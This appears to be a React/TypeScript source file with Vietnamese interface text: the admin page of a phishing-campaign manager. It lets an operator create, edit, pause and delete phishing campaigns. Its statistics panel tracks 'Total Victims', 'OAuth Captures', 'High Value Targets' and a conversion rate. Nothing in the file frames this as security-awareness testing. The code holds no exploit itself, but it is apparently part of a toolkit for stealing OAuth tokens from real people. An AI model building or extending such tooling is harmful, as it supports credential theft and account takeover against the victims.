import { useState } from "react";
import { useQuery, useMutation, useQueryClient } from "@tanstack/react-query";
import { AuthService } from "@/shared/lib/auth";
import { Card, CardContent, CardHeader, CardTitle } from "@/shared/components/ui/card";
import { Button } from "@/shared/components/ui/button";
import { Input } from "@/shared/components/ui/input";
import { Badge } from "@/shared/components/ui/badge";
import {
  Table,
  TableBody,
  TableCell,
  TableHead,
  TableHeader,
  TableRow,
} from "@/shared/components/ui/table";
import {
  Select,
  SelectContent,
  SelectItem,
  SelectTrigger,
  SelectValue,
} from "@/shared/components/ui/select";
import { useToast } from "@/shared/hooks/use-toast";
import {
  Target,
  Search,
  Plus,
  Edit,
  Trash2,
  Play,
  Pause,
  BarChart3,
  Users,
  TrendingUp,
  Calendar,
  RefreshCw,
  Eye,
  Download,
} from "lucide-react";
import { Campaign, PaginatedResponse, FilterOptions } from "@/shared/types";
import {
  formatDate,
  formatRelativeTime,
  debounce,
} from "@/shared/lib/utils";
import { useWebSocket } from "@/shared/hooks/use-websocket";

interface CampaignStats {
  total_victims?: number;
  oauth_captures?: number;
  high_value_targets?: number;
  conversion_rate?: number;
}

export default function Campaigns() {
  const { toast } = useToast();
  const queryClient = useQueryClient();
  const [searchTerm, setSearchTerm] = useState("");
  const [filters, setFilters] = useState<FilterOptions & { status?: string }>({
    page: 1,
    per_page: 20,
    status: "",
  });
  const [selectedCampaign, setSelectedCampaign] = useState<Campaign | null>(null);
  const [showCreateModal, setShowCreateModal] = useState(false);
  const [showEditModal, setShowEditModal] = useState(false);
  const [formData, setFormData] = useState({
    name: "",
    description: "",
    start_date: "",
    end_date: "",
  });

  // Real-time updates via WebSocket
  const { isConnected: wsConnected } = useWebSocket({
    type: 'campaigns',
    enabled: true,
    onMessage: (message) => {
      if (message.type === 'campaign:created' || message.type === 'campaign:updated' || message.type === 'campaign:status-changed') {
        queryClient.invalidateQueries({ queryKey: ['campaigns'] });
        toast({
          title: "Campaign Updated",
          description: "Campaign data has been updated",
        });
      }
    },
  });

  const { data, isLoading, refetch } = useQuery<PaginatedResponse<Campaign>>({
    queryKey: ["campaigns", filters, searchTerm],
    queryFn: () => {
      const params = new URLSearchParams();
      Object.entries({ ...filters, search: searchTerm }).forEach(([key, value]) => {
        if (value) params.append(key, value.toString());
      });
      return AuthService.apiRequest<PaginatedResponse<Campaign>>(`/api/admin/campaigns?${params.toString()}`);
    },
  });

  const { data: campaignStats } = useQuery<CampaignStats | null>({
    queryKey: ["campaign-stats", selectedCampaign?.id],
    queryFn: () => {
      if (!selectedCampaign) return null;
      return AuthService.apiRequest<CampaignStats>(`/api/admin/campaigns/${selectedCampaign.id}/stats`);
    },
    enabled: !!selectedCampaign,
  });

  const createMutation = useMutation({
    mutationFn: (payload: typeof formData) =>
      AuthService.apiRequest<Campaign>("/api/admin/campaigns", {
        method: "POST",
        body: JSON.stringify(payload),
      }),
    onSuccess: () => {
      queryClient.invalidateQueries({ queryKey: ["campaigns"] });
      setShowCreateModal(false);
      setFormData({ name: "", description: "", start_date: "", end_date: "" });
      toast({
        title: "Thành công",
        description: "Campaign đã được tạo thành công",
      });
    },
    onError: (error: Error) => {
      toast({
        title: "Lỗi",
        description: error.message,
        variant: "destructive",
      });
    },
  });

  const updateMutation = useMutation({
    mutationFn: ({ id, data }: { id: string; data: typeof formData }) =>
      AuthService.apiRequest(`/api/admin/campaigns/${id}`, {
        method: "PUT",
        body: JSON.stringify(data),
      }),
    onSuccess: () => {
      queryClient.invalidateQueries({ queryKey: ["campaigns"] });
      setShowEditModal(false);
      setSelectedCampaign(null);
      toast({
        title: "Thành công",
        description: "Campaign đã được cập nhật",
      });
    },
    onError: (error: Error) => {
      toast({
        title: "Lỗi",
        description: error.message,
        variant: "destructive",
      });
    },
  });

  const deleteMutation = useMutation({
    mutationFn: (id: string) =>
      AuthService.apiRequest(`/api/admin/campaigns/${id}`, {
        method: "DELETE",
      }),
    onSuccess: () => {
      queryClient.invalidateQueries({ queryKey: ["campaigns"] });
      toast({
        title: "Thành công",
        description: "Campaign đã được xóa",
      });
    },
    onError: (error: Error) => {
      toast({
        title: "Lỗi",
        description: error.message,
        variant: "destructive",
      });
    },
  });

  const toggleStatusMutation = useMutation({
    mutationFn: ({ id, status }: { id: string; status: string }) =>
      AuthService.apiRequest(`/api/admin/campaigns/${id}/status`, {
        method: "PUT",
        body: JSON.stringify({ status }),
      }),
    onSuccess: () => {
      queryClient.invalidateQueries({ queryKey: ["campaigns"] });
      toast({
        title: "Thành công",
        description: "Trạng thái campaign đã được cập nhật",
      });
    },
    onError: (error: Error) => {
      toast({
        title: "Lỗi",
        description: error.message,
        variant: "destructive",
      });
    },
  });

  const debouncedSearch = debounce((value: string) => {
    setFilters({ ...filters, page: 1 });
  }, 500);

  const handleSearch = (value: string) => {
    setSearchTerm(value);
    debouncedSearch(value);
  };

  const handleCreate = () => {
    createMutation.mutate(formData);
  };

  const handleEdit = () => {
    if (selectedCampaign) {
      updateMutation.mutate({
        id: selectedCampaign.id,
        data: formData,
      });
    }
  };

  const handleDelete = (id: string) => {
    if (!confirm("Bạn có chắc chắn muốn xóa campaign này?")) return;
    deleteMutation.mutate(id);
  };

  const handleToggleStatus = (id: string, currentStatus: string) => {
    const newStatus = currentStatus === 'active' ? 'paused' : 'active';
    toggleStatusMutation.mutate({ id, status: newStatus });
  };

  const getStatusColor = (status: string) => {
    switch (status) {
      case 'active': return 'bg-green-100 text-green-800';
      case 'paused': return 'bg-yellow-100 text-yellow-800';
      case 'completed': return 'bg-blue-100 text-blue-800';
      case 'archived': return 'bg-gray-100 text-gray-800';
      default: return 'bg-gray-100 text-gray-800';
    }
  };

  const getStatusLabel = (status: string) => {
    switch (status) {
      case 'active': return 'Đang hoạt động';
      case 'paused': return 'Tạm dừng';
      case 'completed': return 'Hoàn thành';
      case 'archived': return 'Đã lưu trữ';
      default: return status;
    }
  };

  // Calculate stats from current data
  const totalCampaigns = data?.total || 0;
  const activeCount = data?.items.filter(c => c.status === 'active').length || 0;
  const pausedCount = data?.items.filter(c => c.status === 'paused').length || 0;
  const completedCount = data?.items.filter(c => c.status === 'completed').length || 0;

  return (
    <div className="p-6 max-w-7xl mx-auto">
      {/* Header */}
      <div className="mb-8">
        <div className="flex justify-between items-start">
          <div>
            <h1 className="text-3xl font-bold text-gray-900">Quản lý Campaign</h1>
            <p className="text-gray-600 mt-2">
              Tạo và quản lý các campaign phishing
            </p>
          </div>
          <div className="flex gap-2">
            <div className="flex items-center gap-2 text-sm text-gray-600">
              {wsConnected ? (
                <span className="text-green-600">● Real-time</span>
              ) : (
                <span className="text-gray-400">○ Offline</span>
              )}
            </div>
            <Button
              onClick={() => refetch()}
              variant="outline"
              size="sm"
            >
              <RefreshCw className="h-4 w-4 mr-2" />
              Làm mới
            </Button>
            <Button
              onClick={() => {
                setFormData({ name: "", description: "", start_date: "", end_date: "" });
                setShowCreateModal(true);
              }}
            >
              <Plus className="h-4 w-4 mr-2" />
              Tạo Campaign
            </Button>
          </div>
        </div>
      </div>

      {/* Stats Cards */}
      <div className="grid grid-cols-1 md:grid-cols-4 gap-6 mb-8">
        <Card className="hover:shadow-md transition-shadow">
          <CardContent className="p-6">
            <div className="flex items-center justify-between">
              <div>
                <p className="text-sm font-medium text-gray-600">Tổng Campaign</p>
                <p className="text-2xl font-bold text-gray-900">
                  {totalCampaigns}
                </p>
              </div>
              <div className="p-3 bg-blue-50 rounded-lg">
                <Target className="h-6 w-6 text-blue-600" />
              </div>
            </div>
          </CardContent>
        </Card>
        <Card className="hover:shadow-md transition-shadow">
          <CardContent className="p-6">
            <div className="flex items-center justify-between">
              <div>
                <p className="text-sm font-medium text-gray-600">Đang hoạt động</p>
                <p className="text-2xl font-bold text-green-600">
                  {activeCount}
                </p>
              </div>
              <div className="p-3 bg-green-50 rounded-lg">
                <Play className="h-6 w-6 text-green-600" />
              </div>
            </div>
          </CardContent>
        </Card>
        <Card className="hover:shadow-md transition-shadow">
          <CardContent className="p-6">
            <div className="flex items-center justify-between">
              <div>
                <p className="text-sm font-medium text-gray-600">Tạm dừng</p>
                <p className="text-2xl font-bold text-yellow-600">
                  {pausedCount}
                </p>
              </div>
              <div className="p-3 bg-yellow-50 rounded-lg">
                <Pause className="h-6 w-6 text-yellow-600" />
              </div>
            </div>
          </CardContent>
        </Card>
        <Card className="hover:shadow-md transition-shadow">
          <CardContent className="p-6">
            <div className="flex items-center justify-between">
              <div>
                <p className="text-sm font-medium text-gray-600">Hoàn thành</p>
                <p className="text-2xl font-bold text-blue-600">
                  {completedCount}
                </p>
              </div>
              <div className="p-3 bg-blue-50 rounded-lg">
                <BarChart3 className="h-6 w-6 text-blue-600" />
              </div>
            </div>
          </CardContent>
        </Card>
      </div>

      {/* Filters */}
      <Card className="mb-6">
        <CardContent className="p-6">
          <div className="flex flex-col lg:flex-row gap-4 items-center justify-between">
            <div className="flex flex-1 gap-4 w-full lg:w-auto">
              <div className="relative flex-1 lg:w-80">
                <Search className="absolute left-3 top-1/2 transform -translate-y-1/2 h-4 w-4 text-gray-400" />
                <Input
                  placeholder="Tìm kiếm campaign..."
                  value={searchTerm}
                  onChange={(e) => handleSearch(e.target.value)}
                  className="pl-10"
                />
              </div>
              <Select
                value={filters.status || ""}
                onValueChange={(value) =>
                  setFilters({ ...filters, status: value || undefined, page: 1 })
                }
              >
                <SelectTrigger className="w-40">
                  <SelectValue placeholder="Trạng thái" />
                </SelectTrigger>
                <SelectContent>
                  <SelectItem value="">Tất cả</SelectItem>
                  <SelectItem value="active">Đang hoạt động</SelectItem>
                  <SelectItem value="paused">Tạm dừng</SelectItem>
                  <SelectItem value="completed">Hoàn thành</SelectItem>
                  <SelectItem value="archived">Đã lưu trữ</SelectItem>
                </SelectContent>
              </Select>
            </div>
          </div>
        </CardContent>
      </Card>

      {/* Table */}
      <Card>
        <CardContent className="p-0">
          {isLoading ? (
            <div className="p-12 text-center">
              <div className="animate-spin rounded-full h-12 w-12 border-b-2 border-primary mx-auto mb-4"></div>
              <p className="text-lg font-medium text-gray-700">Đang tải dữ liệu...</p>
            </div>
          ) : data?.items.length === 0 ? (
            <div className="p-12 text-center">
              <Target className="h-12 w-12 mx-auto mb-4 text-gray-300" />
              <p className="text-lg font-medium text-gray-700">Không có campaign nào</p>
              <Button
                onClick={() => setShowCreateModal(true)}
                className="mt-4"
              >
                <Plus className="h-4 w-4 mr-2" />
                Tạo campaign đầu tiên
              </Button>
            </div>
          ) : (
            <Table>
              <TableHeader>
                <TableRow>
                  <TableHead>Tên Campaign</TableHead>
                  <TableHead>Mô tả</TableHead>
                  <TableHead>Trạng thái</TableHead>
                  <TableHead>Ngày bắt đầu</TableHead>
                  <TableHead>Ngày kết thúc</TableHead>
                  <TableHead>Ngày tạo</TableHead>
                  <TableHead className="text-right">Thao tác</TableHead>
                </TableRow>
              </TableHeader>
              <TableBody>
                {data?.items.map((campaign) => (
                  <TableRow key={campaign.id} className="hover:bg-gray-50">
                    <TableCell>
                      <div className="font-medium text-gray-900">{campaign.name}</div>
                    </TableCell>
                    <TableCell>
                      <div className="text-sm text-gray-600 max-w-xs truncate">
                        {campaign.description || "-"}
                      </div>
                    </TableCell>
                    <TableCell>
                      <Badge className={getStatusColor(campaign.status)}>
                        {getStatusLabel(campaign.status)}
                      </Badge>
                    </TableCell>
                    <TableCell>
                      {campaign.start_date ? (
                        <div className="flex items-center gap-2 text-sm">
                          <Calendar className="h-3 w-3 text-gray-400" />
                          <span>{formatDate(campaign.start_date)}</span>
                        </div>
                      ) : (
                        <span className="text-sm text-gray-400">-</span>
                      )}
                    </TableCell>
                    <TableCell>
                      {campaign.end_date ? (
                        <div className="flex items-center gap-2 text-sm">
                          <Calendar className="h-3 w-3 text-gray-400" />
                          <span>{formatDate(campaign.end_date)}</span>
                        </div>
                      ) : (
                        <span className="text-sm text-gray-400">-</span>
                      )}
                    </TableCell>
                    <TableCell>
                      <div className="flex items-center gap-2 text-sm">
                        <Calendar className="h-3 w-3 text-gray-400" />
                        <span>{formatRelativeTime(campaign.created_at)}</span>
                      </div>
                    </TableCell>
                    <TableCell className="text-right">
                      <div className="flex justify-end gap-2">
                        <Button
                          variant="outline"
                          size="sm"
                          onClick={() => {
                            setSelectedCampaign(campaign);
                            setFormData({
                              name: campaign.name,
                              description: campaign.description || "",
                              start_date: campaign.start_date || "",
                              end_date: campaign.end_date || "",
                            });
                            setShowEditModal(true);
                          }}
                        >
                          <Eye className="h-4 w-4 mr-1" />
                          Xem
                        </Button>
                        {campaign.status === 'active' || campaign.status === 'paused' ? (
                          <Button
                            variant="outline"
                            size="sm"
                            onClick={() => handleToggleStatus(campaign.id, campaign.status)}
                            disabled={toggleStatusMutation.isPending}
                          >
                            {campaign.status === 'active' ? (
                              <>
                                <Pause className="h-4 w-4 mr-1" />
                                Tạm dừng
                              </>
                            ) : (
                              <>
                                <Play className="h-4 w-4 mr-1" />
                                Kích hoạt
                              </>
                            )}
                          </Button>
                        ) : null}
                        <Button
                          variant="outline"
                          size="sm"
                          onClick={() => handleDelete(campaign.id)}
                          disabled={deleteMutation.isPending}
                        >
                          <Trash2 className="h-4 w-4 mr-1" />
                          Xóa
                        </Button>
                      </div>
                    </TableCell>
                  </TableRow>
                ))}
              </TableBody>
            </Table>
          )}
        </CardContent>
      </Card>

      {/* Pagination */}
      {data && data.pages > 1 && (
        <div className="mt-6 flex justify-center">
          <div className="flex items-center gap-2">
            <Button
              variant="outline"
              onClick={() => setFilters({ ...filters, page: filters.page! - 1 })}
              disabled={filters.page === 1}
            >
              Trước
            </Button>
            <span className="text-sm text-gray-600 px-4">
              Trang {filters.page} / {data.pages} (Tổng: {data.total} bản ghi)
            </span>
            <Button
              variant="outline"
              onClick={() => setFilters({ ...filters, page: filters.page! + 1 })}
              disabled={filters.page === data.pages}
            >
              Sau
            </Button>
          </div>
        </div>
      )}

      {/* Create Modal */}
      {showCreateModal && (
        <div className="fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center p-4 z-50">
          <div className="bg-white rounded-lg max-w-2xl w-full p-6">
            <h2 className="text-2xl font-bold text-gray-900 mb-6">Tạo Campaign Mới</h2>
            <div className="space-y-4">
              <div>
                <label className="block text-sm font-medium text-gray-700 mb-2">
                  Tên Campaign *
                </label>
                <Input
                  value={formData.name}
                  onChange={(e) => setFormData({ ...formData, name: e.target.value })}
                  placeholder="Nhập tên campaign"
                />
              </div>
              <div>
                <label className="block text-sm font-medium text-gray-700 mb-2">
                  Mô tả
                </label>
                <textarea
                  value={formData.description}
                  onChange={(e) => setFormData({ ...formData, description: e.target.value })}
                  className="w-full px-3 py-2 border border-gray-300 rounded-md focus:outline-none focus:ring-2 focus:ring-blue-500"
                  rows={4}
                  placeholder="Nhập mô tả campaign"
                />
              </div>
              <div className="grid grid-cols-2 gap-4">
                <div>
                  <label className="block text-sm font-medium text-gray-700 mb-2">
                    Ngày bắt đầu
                  </label>
                  <Input
                    type="date"
                    value={formData.start_date}
                    onChange={(e) => setFormData({ ...formData, start_date: e.target.value })}
                  />
                </div>
                <div>
                  <label className="block text-sm font-medium text-gray-700 mb-2">
                    Ngày kết thúc
                  </label>
                  <Input
                    type="date"
                    value={formData.end_date}
                    onChange={(e) => setFormData({ ...formData, end_date: e.target.value })}
                  />
                </div>
              </div>
            </div>
            <div className="flex justify-end gap-4 mt-6">
              <Button
                variant="outline"
                onClick={() => {
                  setShowCreateModal(false);
                  setFormData({ name: "", description: "", start_date: "", end_date: "" });
                }}
              >
                Hủy
              </Button>
              <Button
                onClick={handleCreate}
                disabled={!formData.name || createMutation.isPending}
              >
                {createMutation.isPending ? "Đang tạo..." : "Tạo Campaign"}
              </Button>
            </div>
          </div>
        </div>
      )}

      {/* Edit Modal */}
      {showEditModal && selectedCampaign && (
        <div className="fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center p-4 z-50">
          <div className="bg-white rounded-lg max-w-2xl w-full p-6">
            <h2 className="text-2xl font-bold text-gray-900 mb-6">Chỉnh sửa Campaign</h2>
            <div className="space-y-4">
              <div>
                <label className="block text-sm font-medium text-gray-700 mb-2">
                  Tên Campaign *
                </label>
                <Input
                  value={formData.name}
                  onChange={(e) => setFormData({ ...formData, name: e.target.value })}
                  placeholder="Nhập tên campaign"
                />
              </div>
              <div>
                <label className="block text-sm font-medium text-gray-700 mb-2">
                  Mô tả
                </label>
                <textarea
                  value={formData.description}
                  onChange={(e) => setFormData({ ...formData, description: e.target.value })}
                  className="w-full px-3 py-2 border border-gray-300 rounded-md focus:outline-none focus:ring-2 focus:ring-blue-500"
                  rows={4}
                  placeholder="Nhập mô tả campaign"
                />
              </div>
              <div className="grid grid-cols-2 gap-4">
                <div>
                  <label className="block text-sm font-medium text-gray-700 mb-2">
                    Ngày bắt đầu
                  </label>
                  <Input
                    type="date"
                    value={formData.start_date}
                    onChange={(e) => setFormData({ ...formData, start_date: e.target.value })}
                  />
                </div>
                <div>
                  <label className="block text-sm font-medium text-gray-700 mb-2">
                    Ngày kết thúc
                  </label>
                  <Input
                    type="date"
                    value={formData.end_date}
                    onChange={(e) => setFormData({ ...formData, end_date: e.target.value })}
                  />
                </div>
              </div>
            </div>
            <div className="flex justify-end gap-4 mt-6">
              <Button
                variant="outline"
                onClick={() => {
                  setShowEditModal(false);
                  setSelectedCampaign(null);
                }}
              >
                Hủy
              </Button>
              <Button
                onClick={handleEdit}
                disabled={!formData.name || updateMutation.isPending}
              >
                {updateMutation.isPending ? "Đang cập nhật..." : "Cập nhật"}
              </Button>
            </div>
          </div>
        </div>
      )}

      {/* Campaign Detail Modal */}
      {selectedCampaign && !showEditModal && (
        <div className="fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center p-4 z-50">
          <div className="bg-white rounded-lg max-w-4xl w-full max-h-screen overflow-y-auto p-6">
            <div className="flex justify-between items-center mb-6">
              <h2 className="text-2xl font-bold text-gray-900">
                Chi tiết Campaign: {selectedCampaign.name}
              </h2>
              <Button
                variant="outline"
                onClick={() => setSelectedCampaign(null)}
              >
                Đóng
              </Button>
            </div>

            <div className="grid grid-cols-1 lg:grid-cols-2 gap-6">
              {/* Basic Info */}
              <Card>
                <CardHeader>
                  <CardTitle className="text-lg">Thông tin cơ bản</CardTitle>
                </CardHeader>
                <CardContent className="space-y-4">
                  <div>
                    <label className="text-sm font-medium text-gray-500">Tên Campaign</label>
                    <p className="text-sm font-semibold text-gray-900 mt-1">{selectedCampaign.name}</p>
                  </div>
                  {selectedCampaign.description && (
                    <div>
                      <label className="text-sm font-medium text-gray-500">Mô tả</label>
                      <p className="text-sm text-gray-900 mt-1">{selectedCampaign.description}</p>
                    </div>
                  )}
                  <div>
                    <label className="text-sm font-medium text-gray-500">Trạng thái</label>
                    <Badge className={getStatusColor(selectedCampaign.status)}>
                      {getStatusLabel(selectedCampaign.status)}
                    </Badge>
                  </div>
                  <div>
                    <label className="text-sm font-medium text-gray-500">Ngày tạo</label>
                    <p className="text-sm text-gray-900 mt-1">{formatDate(selectedCampaign.created_at)}</p>
                  </div>
                </CardContent>
              </Card>

              {/* Statistics */}
              {campaignStats && (
                <Card>
                  <CardHeader>
                    <CardTitle className="text-lg">Thống kê</CardTitle>
                  </CardHeader>
                  <CardContent className="space-y-4">
                    <div className="flex items-center justify-between">
                      <span className="text-sm text-gray-600">Tổng Victims</span>
                      <span className="text-lg font-bold text-gray-900">
                        {campaignStats.total_victims || 0}
                      </span>
                    </div>
                    <div className="flex items-center justify-between">
                      <span className="text-sm text-gray-600">OAuth Captures</span>
                      <span className="text-lg font-bold text-green-600">
                        {campaignStats.oauth_captures || 0}
                      </span>
                    </div>
                    <div className="flex items-center justify-between">
                      <span className="text-sm text-gray-600">High Value Targets</span>
                      <span className="text-lg font-bold text-purple-600">
                        {campaignStats.high_value_targets || 0}
                      </span>
                    </div>
                    <div className="flex items-center justify-between">
                      <span className="text-sm text-gray-600">Conversion Rate</span>
                      <span className="text-lg font-bold text-blue-600">
                        {campaignStats.conversion_rate ? `${campaignStats.conversion_rate}%` : '0%'}
                      </span>
                    </div>
                  </CardContent>
                </Card>
              )}
            </div>

            <div className="mt-6 flex justify-end gap-4">
              <Button
                variant="outline"
                onClick={() => {
                  setFormData({
                    name: selectedCampaign.name,
                    description: selectedCampaign.description || "",
                    start_date: selectedCampaign.start_date || "",
                    end_date: selectedCampaign.end_date || "",
                  });
                  setShowEditModal(true);
                }}
              >
                <Edit className="h-4 w-4 mr-2" />
                Chỉnh sửa
              </Button>
            </div>
          </div>
        </div>
      )}
    </div>
  );
}

